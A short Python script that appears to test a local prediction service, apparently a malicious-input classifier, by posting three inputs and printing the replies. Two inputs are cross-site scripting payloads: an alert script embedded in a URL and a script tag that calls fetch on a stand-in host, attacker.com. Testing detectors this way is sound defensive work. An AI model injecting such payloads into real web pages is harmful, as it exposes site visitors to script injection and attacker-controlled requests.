import requests

url = "http://localhost:8000/predict"

data = {"text": "http://example.com/?id=<script>alert('xss')</script>"}
response = requests.post(url, json=data)
print(response.status_code)
print(response.text)
print(response.json())

data = {"text": "Hello World!"}
response = requests.post(url, json=data)
print(response.status_code)
print(response.text)
print(response.json())

data = {"text": "<script>fetch('http://attacker.com')</script>"}
response = requests.post(url, json=data)
print(response.status_code)
print(response.text)
print(response.json())